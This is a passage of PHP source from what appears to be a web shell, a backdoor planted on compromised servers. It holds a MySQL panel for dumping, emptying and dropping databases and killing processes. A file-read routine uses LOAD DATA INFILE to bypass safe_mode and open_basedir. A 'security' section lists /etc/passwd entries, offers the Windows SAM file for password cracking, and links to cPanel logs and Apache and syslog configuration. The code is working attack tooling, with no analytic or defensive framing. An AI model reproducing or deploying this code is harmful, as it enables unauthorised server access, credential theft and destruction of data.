   elseif ($sql_act == "deleterow") {$sql_query = ""; if (!empty($boxrow_all)) {$sql_query = "DELETE * FROM `".$sql_tbl."`;";} else {foreach($boxrow as $v) {$sql_query .= "DELETE * FROM `".$sql_tbl."` WHERE".$v." LIMIT 1;\n";} $sql_query = substr($sql_query,0,-1);} $sql_act = "query";}

   elseif ($sql_tbl_act == "insert")

   {

    if ($sql_tbl_insert_radio == 1)

    {

     $keys = "";

     $akeys = array_keys($sql_tbl_insert);

     foreach ($akeys as $v) {$keys .= "`".addslashes($v)."`, ";}

     if (!empty($keys)) {$keys = substr($keys,0,strlen($keys)-2);}

     $values = "";

     $i = 0;

     foreach (array_values($sql_tbl_insert) as $v) {if ($funct = $sql_tbl_insert_functs[$akeys[$i]]) {$values .= $funct." (";} $values .= "'".addslashes($v)."'"; if ($funct) {$values .= ")";} $values .= ", "; $i++;}

     if (!empty($values)) {$values = substr($values,0,strlen($values)-2);}

     $sql_query = "INSERT INTO `".$sql_tbl."` ( ".$keys." ) VALUES ( ".$values." );";

     $sql_act = "query";

     $sql_tbl_act = "browse";

    }

    elseif ($sql_tbl_insert_radio == 2)

    {

     $set = mysql_buildwhere($sql_tbl_insert,", ",$sql_tbl_insert_functs);

     $sql_query = "UPDATE `".$sql_tbl."` SET ".$set." WHERE ".$sql_tbl_insert_q." LIMIT 1;";

     $result = mysql_query($sql_query) or print(mysql_smarterror());

     $result = mysql_fetch_array($result, MYSQL_ASSOC);

     $sql_act = "query";

     $sql_tbl_act = "browse";

    }

   }

   if ($sql_act == "query")

   {

    echo "<hr size=\"1\" noshade>";

    if (($submit) and (!$sql_query_result) and ($sql_confirm)) {if (!$sql_query_error) {$sql_query_error = "Query was empty";} echo "<b>Error:</b> <br>".$sql_query_error."<br>";}

    if ($sql_query_result or (!$sql_confirm)) {$sql_act = $sql_goto;}

    if ((!$submit) or ($sql_act)) {echo "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td><form action=\"".$sql_surl."\" method=\"POST\"><b>"; if (($sql_query) and (!$submit)) {echo "Do you really want to:";} else {echo "SQL-Query :";} echo "</b><br><br><textarea name=\"sql_query\" cols=\"100\" rows=\"10\">".htmlspecialchars($sql_query)."</textarea><br><br><input type=\"hidden\" name=\"sql_act\" value=\"query\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"submit\" value=\"1\"><input type=\"hidden\" name=\"sql_goto\" value=\"".htmlspecialchars($sql_goto)."\"><input type=\"submit\" name=\"sql_confirm\" value=\"Yes\">&nbsp;<input type=\"submit\" value=\"No\"></form></td></tr></table>";}

   }

   if (in_array($sql_act,$acts))

   {

    ?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php echo htmlspecialchars($sql_db); ?>"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="dump_file" size="30" value="<?php echo "dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql"; ?>">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php

    if (!empty($sql_act)) {echo "<hr size=\"1\" noshade>";}

    if ($sql_act == "newtbl")

    {

     echo "<b>";

     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";

    }

    else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}

   }

   elseif ($sql_act == "dump")

   {

    if (empty($submit))

    {

     $diplay = FALSE;

     echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_act\" value=\"dump\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><b>SQL-Dump:</b><br><br>";

     echo "<b>DB:</b>&nbsp;<input type=\"text\" name=\"sql_db\" value=\"".urlencode($sql_db)."\"><br><br>";

     $v = join (";",$dmptbls);

     echo "<b>Only tables (explode \";\")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type=\"text\" name=\"dmptbls\" value=\"".htmlspecialchars($v)."\" size=\"".(strlen($v)+5)."\"><br><br>";

     if ($dump_file) {$tmp = $dump_file;}

     else {$tmp = htmlspecialchars("./dump_".getenv("SERVER_NAME")."_".$sql_db."_".date("d-m-Y-H-i-s").".sql");}

     echo "<b>File:</b>&nbsp;<input type=\"text\" name=\"sql_dump_file\" value=\"".$tmp."\" size=\"".(strlen($tmp)+strlen($tmp) % 30)."\"><br><br>";

     echo "<b>Download: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_download\" value=\"1\" checked><br><br>";

     echo "<b>Save to file: </b>&nbsp;<input type=\"checkbox\" name=\"sql_dump_savetofile\" value=\"1\" checked>";

     echo "<br><br><input type=\"submit\" name=\"submit\" value=\"Dump\"><br><br><b><sup>1</sup></b> - all, if empty";

     echo "</form>";

    }

    else

    {

     $diplay = TRUE;

     $set = array();

     $set["sock"] = $sql_sock;

     $set["db"] = $sql_db;

     $dump_out = "download";

     $set["print"] = 0;

     $set["nl2br"] = 0;

     $set[""] = 0;

     $set["file"] = $dump_file;

     $set["add_drop"] = TRUE;

     $set["onlytabs"] = array();

     if (!empty($dmptbls)) {$set["onlytabs"] = explode(";",$dmptbls);}

     $ret = mysql_dump($set);

     if ($sql_dump_download)

     {

      @ob_clean();

      header("Content-type: application/octet-stream");

      header("Content-length: ".strlen($ret));

      header("Content-disposition: attachment; filename=\"".basename($sql_dump_file)."\";");

      echo $ret;

      exit;

     }

     elseif ($sql_dump_savetofile)

     {

      $fp = fopen($sql_dump_file,"w");

      if (!$fp) {echo "<b>Dump error! Can't write to \"".htmlspecialchars($sql_dump_file)."\"!";}

      else

      {

       fwrite($fp,$ret);

       fclose($fp);

       echo "<b>Dumped! Dump has been writed to \"".htmlspecialchars(realpath($sql_dump_file))."\" (".view_size(filesize($sql_dump_file)).")</b>.";

      }

     }

     else {echo "<b>Dump: nothing to do!</b>";}

    }

   }

   if ($diplay)

   {

    if (!empty($sql_tbl))

    {

     if (empty($sql_tbl_act)) {$sql_tbl_act = "browse";}

     $count = mysql_query("SELECT COUNT(*) FROM `".$sql_tbl."`;");

     $count_row = mysql_fetch_array($count);

     mysql_free_result($count);

     $tbl_struct_result = mysql_query("SHOW FIELDS FROM `".$sql_tbl."`;");

     $tbl_struct_fields = array();

     while ($row = mysql_fetch_assoc($tbl_struct_result)) {$tbl_struct_fields[] = $row;}

     if ($sql_ls > $sql_le) {$sql_le = $sql_ls + $perpage;}

     if (empty($sql_tbl_page)) {$sql_tbl_page = 0;}

     if (empty($sql_tbl_ls)) {$sql_tbl_ls = 0;}

     if (empty($sql_tbl_le)) {$sql_tbl_le = 30;}

     $perpage = $sql_tbl_le - $sql_tbl_ls;

     if (!is_numeric($perpage)) {$perpage = 10;}

     $numpages = $count_row[0]/$perpage;

     $e = explode(" ",$sql_order);

     if (count($e) == 2)

     {

      if ($e[0] == "d") {$asc_desc = "DESC";}

      else {$asc_desc = "ASC";}

      $v = "ORDER BY `".$e[1]."` ".$asc_desc." ";

     }

     else {$v = "";}

     $query = "SELECT * FROM `".$sql_tbl."` ".$v."LIMIT ".$sql_tbl_ls." , ".$perpage."";

     $result = mysql_query($query) or print(mysql_smarterror());

     echo "<hr size=\"1\" noshade><center><b>Table ".htmlspecialchars($sql_tbl)." (".mysql_num_fields($result)." cols and ".$count_row[0]." rows)</b></center>";

     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=structure\">[&nbsp;<b>Structure</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";

     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=browse\">[&nbsp;<b>Browse</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";

     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_act=tbldump&thistbl=1\">[&nbsp;<b>Dump</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";

     echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_tbl_act=insert\">[&nbsp;<b>Insert</b>&nbsp;]</a>&nbsp;&nbsp;&nbsp;";

     if ($sql_tbl_act == "structure") {echo "<br><br><b>Coming sooon!</b>";}

     if ($sql_tbl_act == "insert")

     {

      if (!is_array($sql_tbl_insert)) {$sql_tbl_insert = array();}

      if (!empty($sql_tbl_insert_radio))

      {



      }

      else

      {

       echo "<br><br><b>Inserting row into table:</b><br>";

       if (!empty($sql_tbl_insert_q))

       {

        $sql_query = "SELECT * FROM `".$sql_tbl."`";

        $sql_query .= " WHERE".$sql_tbl_insert_q;

        $sql_query .= " LIMIT 1;";

        $result = mysql_query($sql_query,$sql_sock) or print("<br><br>".mysql_smarterror());

        $values = mysql_fetch_assoc($result);

        mysql_free_result($result);

       }

       else {$values = array();}

       echo "<form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1><tr><td><b>Field</b></td><td><b>Type</b></td><td><b>Function</b></td><td><b>Value</b></td></tr>";

       foreach ($tbl_struct_fields as $field)

       {

        $name = $field["Field"];

        if (empty($sql_tbl_insert_q)) {$v = "";}

        echo "<tr><td><b>".htmlspecialchars($name)."</b></td><td>".$field["Type"]."</td><td><select name=\"sql_tbl_insert_functs[".htmlspecialchars($name)."]\"><option value=\"\"></option><option>PASSWORD</option><option>MD5</option><option>ENCRYPT</option><option>ASCII</option><option>CHAR</option><option>RAND</option><option>LAST_INSERT_ID</option><option>COUNT</option><option>AVG</option><option>SUM</option><option value=\"\">--------</option><option>SOUNDEX</option><option>LCASE</option><option>UCASE</option><option>NOW</option><option>CURDATE</option><option>CURTIME</option><option>FROM_DAYS</option><option>FROM_UNIXTIME</option><option>PERIOD_ADD</option><option>PERIOD_DIFF</option><option>TO_DAYS</option><option>UNIX_TIMESTAMP</option><option>USER</option><option>WEEKDAY</option><option>CONCAT</option></select></td><td><input type=\"text\" name=\"sql_tbl_insert[".htmlspecialchars($name)."]\" value=\"".htmlspecialchars($values[$name])."\" size=50></td></tr>";

        $i++;

       }

       echo "</table><br>";

       echo "<input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"1\""; if (empty($sql_tbl_insert_q)) {echo " checked";} echo "><b>Insert as new row</b>";

       if (!empty($sql_tbl_insert_q)) {echo " or <input type=\"radio\" name=\"sql_tbl_insert_radio\" value=\"2\" checked><b>Save</b>"; echo "<input type=\"hidden\" name=\"sql_tbl_insert_q\" value=\"".htmlspecialchars($sql_tbl_insert_q)."\">";}

       echo "<br><br><input type=\"submit\" value=\"Confirm\"></form>";

      }

     }

     if ($sql_tbl_act == "browse")

     {

      $sql_tbl_ls = abs($sql_tbl_ls);

      $sql_tbl_le = abs($sql_tbl_le);

      echo "<hr size=\"1\" noshade>";

      echo "<img src=\"".$surl."act=img&img=multipage\" height=\"12\" width=\"10\" alt=\"Pages\">&nbsp;";

      $b = 0;

      for($i=0;$i<$numpages;$i++)

      {

       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "<a href=\"".$sql_surl."sql_tbl=".urlencode($sql_tbl)."&sql_order=".htmlspecialchars($sql_order)."&sql_tbl_ls=".($i*$perpage)."&sql_tbl_le=".($i*$perpage+$perpage)."\"><u>";}

       echo $i;

       if (($i*$perpage != $sql_tbl_ls) or ($i*$perpage+$perpage != $sql_tbl_le)) {echo "</u></a>";}

       if (($i/30 == round($i/30)) and ($i > 0)) {echo "<br>";}

       else {echo "&nbsp;";}

      }

      if ($i == 0) {echo "empty";}

      echo "<form method=\"GET\"><input type=\"hidden\" name=\"act\" value=\"sql\"><input type=\"hidden\" name=\"sql_db\" value=\"".htmlspecialchars($sql_db)."\"><input type=\"hidden\" name=\"sql_login\" value=\"".htmlspecialchars($sql_login)."\"><input type=\"hidden\" name=\"sql_passwd\" value=\"".htmlspecialchars($sql_passwd)."\"><input type=\"hidden\" name=\"sql_server\" value=\"".htmlspecialchars($sql_server)."\"><input type=\"hidden\" name=\"sql_port\" value=\"".htmlspecialchars($sql_port)."\"><input type=\"hidden\" name=\"sql_tbl\" value=\"".htmlspecialchars($sql_tbl)."\"><input type=\"hidden\" name=\"sql_order\" value=\"".htmlspecialchars($sql_order)."\"><b>From:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_ls\" value=\"".$sql_tbl_ls."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"sql_tbl_le\" value=\"".$sql_tbl_le."\">&nbsp;<input type=\"submit\" value=\"View\"></form>";

      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"1%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1>";

      echo "<tr>";

      echo "<td><input type=\"checkbox\" name=\"boxrow_all\" value=\"1\"></td>";

      for ($i=0;$i<mysql_num_fields($result);$i++)

      {

       $v = mysql_field_name($result,$i);

       if ($e[0] == "a") {$s = "d"; $m = "asc";}

       else {$s = "a"; $m = "desc";}

       echo "<td>";

       if (empty($e[0])) {$e[0] = "a";}

       if ($e[1] != $v) {echo "<a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$e[0]."%20".$v."\"><b>".$v."</b></a>";}

       else {echo "<b>".$v."</b><a href=\"".$sql_surl."sql_tbl=".$sql_tbl."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_ls=".$sql_tbl_ls."&sql_order=".$s."%20".$v."\"><img src=\"".$surl."act=img&img=sort_".$m."\" height=\"9\" width=\"14\" alt=\"".$m."\"></a>";}

       echo "</td>";

      }

      echo "<td><font color=\"green\"><b>Action</b></font></td>";

      echo "</tr>";

      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))

      {

       echo "<tr>";

       $w = "";

       $i = 0;

       foreach ($row as $k=>$v) {$name = mysql_field_name($result,$i); $w .= " `".$name."` = '".addslashes($v)."' AND"; $i++;}

       if (count($row) > 0) {$w = substr($w,0,strlen($w)-3);}

       echo "<td><input type=\"checkbox\" name=\"boxrow[]\" value=\"".$w."\"></td>";

       $i = 0;

       foreach ($row as $k=>$v)

       {

        $v = htmlspecialchars($v);

        if ($v == "") {$v = "<font color=\"green\">NULL</font>";}

        echo "<td>".$v."</td>";

        $i++;

       }

       echo "<td>";

       echo "<a href=\"".$sql_surl."sql_act=query&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_query=".urlencode("DELETE FROM `".$sql_tbl."` WHERE".$w." LIMIT 1;")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Delete\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;";

       echo "<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".urlencode($sql_tbl)."&sql_tbl_ls=".$sql_tbl_ls."&sql_tbl_le=".$sql_tbl_le."&sql_tbl_insert_q=".urlencode($w)."\"><img src=\"".$surl."act=img&img=change\" alt=\"Edit\" height=\"14\" width=\"14\" border=\"0\"></a>&nbsp;";

       echo "</td>";

       echo "</tr>";

      }

      mysql_free_result($result);

      echo "</table><hr size=\"1\" noshade><p align=\"left\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";

      echo "<option value=\"\">With selected:</option>";

      echo "<option value=\"deleterow\">Delete</option>";

      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";

     }

    }

    else

    {

     $result = mysql_query("SHOW TABLE STATUS", $sql_sock);

     if (!$result) {echo mysql_smarterror();}

     else

     {

      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#666666 cellPadding=5 width=\"100%\" bgColor=#15354c borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";

      

      $i = 0;

      $tsize = $trows = 0;

      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))

      {

       $tsize += $row["Data_length"];

       $trows += $row["Rows"];

       $size = view_size($row["Data_length"]);

       echo "<tr>";

       echo "<td><input type=\"checkbox\" name=\"boxtbl[]\" value=\"".$row["Name"]."\"></td>";

       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_tbl=".urlencode($row["Name"])."\"><b>".$row["Name"]."</b></a>&nbsp;</td>";

       echo "<td>".$row["Rows"]."</td>";

       echo "<td>".$row["Type"]."</td>";

       echo "<td>".$row["Create_time"]."</td>";

       echo "<td>".$row["Update_time"]."</td>";

       echo "<td>".$size."</td>";

       echo "<td>&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DELETE FROM `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_empty\" alt=\"Empty\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;&nbsp;<a href=\"".$sql_surl."sql_act=query&sql_query=".urlencode("DROP TABLE `".$row["Name"]."`")."\"><img src=\"".$surl."act=img&img=sql_button_drop\" alt=\"Drop\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;<a href=\"".$sql_surl."sql_tbl_act=insert&sql_tbl=".$row["Name"]."\"><img src=\"".$surl."act=img&img=sql_button_insert\" alt=\"Insert\" height=\"13\" width=\"11\" border=\"0\"></a>&nbsp;</td>";

       echo "</tr>";

       $i++;

      }

      echo "<tr bgcolor=\"000000\">";

      echo "<td><center><b>»</b></center></td>";

      echo "<td><center><b>".$i." table(s)</b></center></td>";

      echo "<td><b>".$trows."</b></td>";

      echo "<td>".$row[1]."</td>";

      echo "<td>".$row[10]."</td>";

      echo "<td>".$row[11]."</td>";

      echo "<td><b>".view_size($tsize)."</b></td>";

      echo "<td></td>";

      echo "</tr>";

      echo "</table><hr size=\"1\" noshade><p align=\"right\"><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\"><select name=\"sql_act\">";

      echo "<option value=\"\">With selected:</option>";

      echo "<option value=\"tbldrop\">Drop</option>";

      echo "<option value=\"tblempty\">Empty</option>";

      echo "<option value=\"tbldump\">Dump</option>";

      echo "<option value=\"tblcheck\">Check table</option>";

      echo "<option value=\"tbloptimize\">Optimize table</option>";

      echo "<option value=\"tblrepair\">Repair table</option>";

      echo "<option value=\"tblanalyze\">Analyze table</option>";

      echo "</select>&nbsp;<input type=\"submit\" value=\"Confirm\"></form></p>";

      mysql_free_result($result);

     }

    }

   }

   }

  }

  else

  {

   $acts = array("","newdb","serverstatus","servervars","processes","getfile");

   if (in_array($sql_act,$acts)) {?><table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new DB:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newdb"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_newdb" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>View File:</b><form action="<?php echo $surl; ?>"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="getfile"><input type="hidden" name="sql_login" value="<?php echo htmlspecialchars($sql_login); ?>"><input type="hidden" name="sql_passwd" value="<?php echo htmlspecialchars($sql_passwd); ?>"><input type="hidden" name="sql_server" value="<?php echo htmlspecialchars($sql_server); ?>"><input type="hidden" name="sql_port" value="<?php echo htmlspecialchars($sql_port); ?>"><input type="text" name="sql_getfile" size="30" value="<?php echo htmlspecialchars($sql_getfile); ?>">&nbsp;<input type="submit" value="Get"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php }

   if (!empty($sql_act))

   {

    echo "<hr size=\"1\" noshade>";

    if ($sql_act == "newdb")

    {

     echo "<b>";

     if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo "DB \"".htmlspecialchars($sql_newdb)."\" has been created with success!</b><br>";}

     else {echo "Can't create DB \"".htmlspecialchars($sql_newdb)."\".<br>Reason:</b> ".mysql_smarterror();}

    }

    if ($sql_act == "serverstatus")

    {

     $result = mysql_query("SHOW STATUS", $sql_sock);

     echo "<center><b>Server-status variables:</b><br><br>";

     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#15354c borderColorLight=#15354c border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";

     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}

     echo "</table></center>";

     mysql_free_result($result);

    }

    if ($sql_act == "servervars")

    {

     $result = mysql_query("SHOW VARIABLES", $sql_sock);

     echo "<center><b>Server variables:</b><br><br>";

     echo "<TABLE cellSpacing=0 cellPadding=0 bgColor=#15354c borderColorLight=#15354c border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";

     while ($row = mysql_fetch_array($result, MYSQL_NUM)) {echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td></tr>";}

     echo "</table>";

     mysql_free_result($result);

    }

    if ($sql_act == "processes")

    {

     if (!empty($kill)) {$query = "KILL ".$kill.";"; $result = mysql_query($query, $sql_sock); echo "<b>Killing process #".$kill."... ok. he is dead, amen.</b>";}

     $result = mysql_query("SHOW PROCESSLIST", $sql_sock);

     echo "<center><b>Processes:</b><br><br>";

     echo "<TABLE cellSpacing=0 cellPadding=2 bgColor=#15354c borderColorLight=#15354c border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";

     while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo "<tr><td>".$row[0]."</td><td>".$row[1]."</td><td>".$row[2]."</td><td>".$row[3]."</td><td>".$row[4]."</td><td>".$row[5]."</td><td>".$row[6]."</td><td>".$row[7]."</td><td><a href=\"".$sql_surl."sql_act=processes&kill=".$row[0]."\"><u>Kill</u></a></td></tr>";}

     echo "</table>";

     mysql_free_result($result);

    }

    if ($sql_act == "getfile")

    {

     $tmpdb = $sql_login."_tmpdb";

     $select = mysql_select_db($tmpdb);

     if (!$select) {mysql_create_db($tmpdb); $select = mysql_select_db($tmpdb); $created = !!$select;}

     if ($select)

     {

      $created = FALSE;

      mysql_query("CREATE TABLE `tmp_file` ( `Viewing the file in safe_mode+open_basedir` LONGBLOB NOT NULL );");

      mysql_query("LOAD DATA INFILE \"".addslashes($sql_getfile)."\" INTO TABLE tmp_file");

      $result = mysql_query("SELECT * FROM tmp_file;");

      if (!$result) {echo "<b>Error in reading file (permision denied)!</b>";}

      else

      {

       for ($i=0;$i<mysql_num_fields($result);$i++) {$name = mysql_field_name($result,$i);}

       $f = "";

       while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {$f .= join ("\r\n",$row);}

       if (empty($f)) {echo "<b>File \"".$sql_getfile."\" does not exists or empty!</b><br>";}

       else {echo "<b>File \"".$sql_getfile."\":</b><br>".nl2br(htmlspecialchars($f))."<br>";}

       mysql_free_result($result);

       mysql_query("DROP TABLE tmp_file;");

      }

     }

     mysql_drop_db($tmpdb); //comment it if you want to leave database

    }

   }

  }

 }

 echo "</td></tr></table>";

 if ($sql_sock)

 {

  $affected = @mysql_affected_rows($sql_sock);

  if ((!is_numeric($affected)) or ($affected < 0)){$affected = 0;}

  echo "<tr><td><center><b>Affected rows: ".$affected."</center></td></tr>";

 }

 echo "</table>";

}

if ($act == "mkdir")
{

 if ($mkdir != $d)
 {

  if (file_exists($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: object alredy exists";}

  elseif (!mkdir($mkdir)) {echo "<b>Make Dir \"".htmlspecialchars($mkdir)."\"</b>: access denied";}

  echo "<br><br>";

 }

 $act = $dspact = "ls";

}

if ($act == "d")

{

 if (!is_dir($d)) {echo "<center><b>Permision denied!</b></center>";}

 else

 {

  echo "<b>Directory information:</b><table border=0 cellspacing=1 cellpadding=2>";

  if (!$win)

  {

   echo "<tr><td><b>Owner/Group</b></td><td> ";

   $ow = posix_getpwuid(fileowner($d));

   $gr = posix_getgrgid(filegroup($d));

   $row[] = ($ow["name"]?$ow["name"]:fileowner($d))."/".($gr["name"]?$gr["name"]:filegroup($d));

  }

  echo "<tr><td><b>Perms</b></td><td><a href=\"".$surl."act=chmod&d=".urlencode($d)."\"><b>".view_perms_color($d)."</b></a><tr><td><b>Create time</b></td><td> ".date("d/m/Y H:i:s",filectime($d))."</td></tr><tr><td><b>Access time</b></td><td> ".date("d/m/Y H:i:s",fileatime($d))."</td></tr><tr><td><b>MODIFY time</b></td><td> ".date("d/m/Y H:i:s",filemtime($d))."</td></tr></table><br>";

 }

}


if ($act == "security")
{

 echo "<center><b>Server security information:</b></center><b>Open base dir: ".$hopenbasedir."</b><br>";

 if (!$win)

 {

  if ($nixpasswd)

  {

   if ($nixpasswd == 1) {$nixpasswd = 0;}

   echo "<b>*nix /etc/passwd:</b><br>";

   if (!is_numeric($nixpwd_s)) {$nixpwd_s = 0;}

   if (!is_numeric($nixpwd_e)) {$nixpwd_e = $nixpwdperpage;}

   echo "<form action=\"".$surl."\"><input type=hidden name=act value=\"security\"><input type=hidden name=\"nixpasswd\" value=\"1\"><b>From:</b>&nbsp;<input type=\"text=\" name=\"nixpwd_s\" value=\"".$nixpwd_s."\">&nbsp;<b>To:</b>&nbsp;<input type=\"text\" name=\"nixpwd_e\" value=\"".$nixpwd_e."\">&nbsp;<input type=submit value=\"View\"></form><br>";

   $i = $nixpwd_s;

   while ($i < $nixpwd_e)

   {

    $uid = posix_getpwuid($i);

    if ($uid)

    {

     $uid["dir"] = "<a href=\"".$surl."act=ls&d=".urlencode($uid["dir"])."\">".$uid["dir"]."</a>";

     echo join(":",$uid)."<br>";

    }

    $i++;

   }

  }

  else {echo "<br><a href=\"".$surl."act=security&nixpasswd=1&d=".$ud."\"><b><u>Get /etc/passwd</u></b></a><br>";}

 }

 else
 {
  $v = $_SERVER["WINDIR"]."\repair\sam";

  if (file_get_contents($v)) {echo "<b><font color=red>You can't crack winnt passwords(".$v.") </font></b><br>";}

  else {echo "<b><font color=green>You can crack winnt passwords. <a href=\"".$surl."act=f&f=sam&d=".$_SERVER["WINDIR"]."\\repair&ft=download\"><u><b>Download</b></u></a>, and use lcp.crack+ ©.</font></b><br>";}
 }

 if (file_get_contents("/etc/userdomains")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=userdomains&d=".urlencode("/etc")."&ft=txt\"><u><b>View cpanel user-domains logs</b></u></a></font></b><br>";}

 if (file_get_contents("/var/cpanel/accounting.log")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=accounting.log&d=".urlencode("/var/cpanel/")."\"&ft=txt><u><b>View cpanel logs</b></u></a></font></b><br>";}

 if (file_get_contents("/usr/local/apache/conf/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/usr/local/apache/conf")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/httpd.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=httpd.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Apache configuration (httpd.conf)</b></u></a></font></b><br>";}

 if (file_get_contents("/etc/syslog.conf")) {echo "<b><font color=green><a href=\"".$surl."act=f&f=syslog.conf&d=".urlencode("/etc")."&ft=txt\"><u><b>Syslog configuration (syslog.conf)</b></u></a></font></b><br>";}

